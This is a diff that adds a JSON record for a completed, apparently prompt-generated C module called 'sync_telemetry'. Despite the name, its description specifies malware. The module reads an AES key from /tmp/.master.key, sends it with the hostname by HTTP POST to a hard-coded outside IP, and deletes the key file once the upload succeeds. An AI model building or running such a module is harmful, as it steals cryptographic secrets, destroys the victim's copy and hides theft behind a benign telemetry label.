@@ -1,0 +1,13 @@
+{
+  "code_lines": 172,
+  "code_path": "modules/sync_telemetry.c",
+  "code_sha256": "9420b32a2a8746afe314117418f9e7fac9565961c5939b5a745eb4808f792152",
+  "description": "Read /tmp/.master.key using fopen/fread, extract aes_key value via manual JSON parsing: use strstr to find \"\\\"aes_key\\\":\\\"\", advance pointer by strlen(\"\\\"aes_key\\\":\\\"\") (11 bytes), then strchr to find closing quote; validate length > 0. Obtain hostname via gethostname(). Construct JSON payload {\"aes_key\":\"<value>\",\"hostname\":\"<hostname>\"}. Transmit via HTTP POST to http://10.254.19.73:8080/collect using libcurl with Content-Type: application/json. On HTTP 200 response, remove /tmp/.master.key using remove().",
+  "duration_seconds": 88.602421,
+  "finished_at": "2026-09-23T22:52:40.324+00:00",
+  "index": 5,
+  "name": "sync_telemetry",
+  "prompt_path": "modules/05_sync_telemetry/prompt.txt",
+  "started_at": "2026-09-23T22:51:11.721+00:00",
+  "status": "completed"
+}
